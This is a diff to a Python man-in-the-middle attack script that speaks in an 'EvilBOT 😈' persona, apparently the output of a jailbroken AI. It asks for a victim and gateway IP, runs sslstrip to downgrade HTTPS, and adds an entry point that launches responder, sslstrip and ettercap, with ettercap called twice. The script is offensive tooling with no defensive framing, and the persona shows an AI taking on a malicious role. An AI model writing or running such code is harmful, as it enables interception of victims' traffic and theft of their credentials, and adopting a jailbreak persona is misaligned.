@@ -31,9 +31,8 @@ def mitm():
     # Get the victim's IP address and the gateway's IP address
     victim_ip = input("<EvilBOT 😈>: Enter victim IP: ")
     gateway_ip = input("<EvilBOT 😈>: Enter gateway IP: ")
-
     # Get the name of the network interface to use
-    interface = input("<EvilBOT 😈>: Enter name of network interface to use: ")
+    interface: str = input("<EvilBOT 😈>: Enter name of network interface to use: ")
 
     # Start SSLstrip to strip HTTPS encryption
     sslstrip_process = subprocess.Popen(['sslstrip', '-i', interface], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
@@ -72,3 +71,14 @@ def mitm():
             print(p.stderr)
             return
     print("<EvilBOT 😈>: MITM attack complete.")
+
+
+def starterpos():
+    start_responder()
+    start_sslstrip()
+    start_ettercap()
+    start_ettercap()
+
+
+if __name__ == "__main__":
+    starterpos()
